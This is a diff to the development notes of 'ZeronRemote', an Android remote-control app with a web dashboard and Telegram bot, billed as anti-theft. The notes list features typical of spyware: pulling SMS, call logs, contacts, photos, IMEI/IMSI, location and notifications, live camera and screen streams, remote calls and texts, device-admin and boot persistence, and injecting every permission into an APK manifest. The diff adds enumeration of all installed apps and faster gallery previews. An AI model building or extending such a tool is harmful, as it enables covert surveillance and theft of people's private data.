@@ -1,6 +1,6 @@
 # 🌐 ZeronRemote — Website + Live Dashboard + Server Remote Control + Anti-Theft
 
-**Status:** 🟢 LIVE & DEPLOYED. Server v5.3 (offline-bug fix, dual-mode protocol ver2, velocity natural gestures, fast poll 1s).
+**Status:** 🟢 LIVE & DEPLOYED. Server v5.3 (offline-bug fix, dual-mode protocol ver2, velocity natural gestures, fast poll 1s). Latest round v5.9: QUERY_ALL_PACKAGES, gprev fast preview, open-app, 4-page polish.
 
 ## Live Info
 - **Server:** `https://zeronremote-production.up.railway.app` (Railway, service `zeronremote`)
@@ -26,10 +26,10 @@
 - **control.html** — v5.3 remote control: full-bleed screen + touch overlay; **dual-mode** (device screeninfo ver=2 → % coords; old apk → px with NAT size); velocity-based gestures (fling/swipe/scroll natural Android feel); `.jpg` polling 900ms; noShare auto-start overlay; settings sheet (sens/tapD/swD/X-Y% offset/long-press, localStorage); 80px top pad; szdebug shows real WxH+vN. **control.js** external. server serves any `*.css|js|svg`.
 - **cam.html** — premium: corner brackets, LIVE blink pill, Selfie/Rear cards, stream health, MJPEG fullscreen. No appbar/bnav.
 - **files.html** — v4.4: header floating (env+82px), `<--toph:148px`, compact 560px centered, **dedicated scroll container**. wrap absolute top env+148px bottom 0 overflow-y:auto, body overflow hidden, touch-action pan-y, padding 0 14px 120px. Preview lightbox + bottom sheet (Send to TG /tgdl, Zip /tgzip, Download, Close). pollDone stops reload loop. Grid/list toggle, breadcrumbs, search, skeleton.
-- **applist.html** — search, app name/pkg/version, permission chips (granted/denied/total), expandable perm list, letter avatars. Data via `/api/data?key=apps` (device buildAppsJson push).
-- **contactlist.html** — search, initials avatar, Call/SMS buttons (send `/call` `/sendsms` cmds). Data `/api/data?key=contacts`.
-- **callhist.html** — search + All/In/Out/Missed filter tabs, dur + time. Data `/api/data?key=calllog`.
-- **gallery.html** — photo grid (104px cells), lightbox preview (via `/filepush` → blob → `/api/fget`), thumb 720px for >8MB, **Send to Telegram** (download = /tgdl → bot only). Data `/api/data?key=gallery`.
+- **applist.html** — search, app name/pkg/version, permission chips (granted/denied/total), expandable perm list, letter avatars, **Open on device** button (i-launch → `/open <pkg>`). Data via `/api/data?key=apps` (device buildAppsJson push, includes `sys` flag for filtering).
+- **contactlist.html** — search, initials avatar, Call/SMS/Copy-number buttons (send `/call` `/sendsms` cmds). Data `/api/data?key=contacts`.
+- **callhist.html** — search + All/In/Out/Missed filter tabs, **relTime (aji/xm/xh/xd age) + mm:ss duration format**. Data `/api/data?key=calllog`.
+- **gallery.html** — photo grid (104px cells), lightbox preview (via **`/gprev` → 480px/70 jpeg` fast** → blob → `/api/fget`), thumb 720px for >8MB, **Send to Telegram** (download = /tgdl → bot only). Data `/api/data?key=gallery`.
 - **hub.html** — full dashboard bottom nav (Hub/Camera/Screen/Files).
 - **sms.html** — v3.9: header 76px fixed, search 148px offset, full-page scroll.
 - **common.js** — pill(), pollSys(), go(), snack(), logMsg(), U(), icon(), fmt(), esc().
@@ -46,6 +46,7 @@
 - **Foreground:** startForegroundCompat — computeFgsType() = only GRANTED perms (Android 14+ SecurityException fix), startForeground(3-arg) API34+.
 - **Background features:** ensureFgsForCapture() + releaseTorchCam() (flash's camera khule rakhe → "camera busy"), requestLocationUpdates API31+/singleUpdate fallback, 15s retry + 40s timeout.
 - **sendSimInfo():** IMEI/phone/ICCID/IMSI/operator/network/state/signal. **sendWifiInfo():** speed/freq/BSSID/IP/gateway/nearby.
+- **Send info** — device side: buildAppsJson (icons base64 + perms + sys flag), isSystemOnly() filter (FLAG_SYSTEM && !FLAG_UPDATED_SYSTEM_APP), QUERY_ALL_PACKAGES manifest, MediaStore sendGallery scan (500 media, newest first, inline 160px th), doGprev (480px scaled jpeg 70), doOpenApp.
 - File push to web: `/filepush` + pushFileToWeb + scaledBitmap (8MB+ → 720px thumb).
 - sendMessageWithWebApp() web_app inline buttons.
 - keep-alive: PollRunnable 45s startForegroundCompat re-post + heartbeat() /api/sys + KeepAliveReceiver exact alarm.
@@ -64,7 +65,9 @@
 - **MyNotificationListenerService.java** — notif forward to bot.
 - **ScreenCaptureActivity.java** / **LockAlertActivity.java**.
 - Manifest injection: `Injection/androidmanifest/attributes.json` (all perms) + `app_components.txt` (services/receivers, foregroundServiceType=`camera|microphone|location|mediaProjection`, QUICKBOOT/LOCKED_BOOT actions).
-- Full permission list: INTERNET, SMS (read/send/receive), CALL_LOG, PHONE_STATE, CAMERA, RECORD_AUDIO, LOCATION (fine/coarse/background), BOOT, FGS+CAMERA+MIC+LOCATION+MEDIA_PROJECTION+SPECIAL_USE, NOTIF_LISTENER, POST_NOTIFICATIONS, VIBRATE, FLASHLIGHT, WAKE_LOCK, WIFI, DEVICE_ADMIN, BATTERY_OPT, OVERLAY, WRITE_SETTINGS, MANAGE_EXTERNAL_STORAGE, SCHEDULE_EXACT_ALARM, FULL_SCREEN_INTENT, READ_CONTACTS, CALL_PHONE.
+- Full permission list: INTERNET, SMS (read/send/receive), CALL_LOG, PHONE_STATE, CAMERA, RECORD_AUDIO, LOCATION (fine/coarse/background), BOOT, FGS+CAMERA+MIC+LOCATION+MEDIA_PROJECTION+SPECIAL_USE, NOTIF_LISTENER, POST_NOTIFICATIONS, VIBRATE, FLASHLIGHT, WAKE_LOCK, WIFI, DEVICE_ADMIN, BATTERY_OPT, OVERLAY, WRITE_SETTINGS, MANAGE_EXTERNAL_STORAGE, SCHEDULE_EXACT_ALARM, FULL_SCREEN_INTENT, READ_CONTACTS, CALL_PHONE, **QUERY_ALL_PACKAGES**.
+74. **QUERY_ALL_PACKAGES** — Android 11+ package visibility: chara sudhu 12 (system/self) apps dekha jay; pakshi sob installed apps list hobe. Fix = permission + rebuild. ✅
+75. **gallery preview** — 5MB+ full-file `/filepush` slow → `doGprev` 480px/70 jpeg; tgdl TG e file pathan (60MB limit).
 
 ## Known bugs / learned (must-read)
 1. **`&key=` vs `?key=`** frontend 404 → use `?key=`. ✅
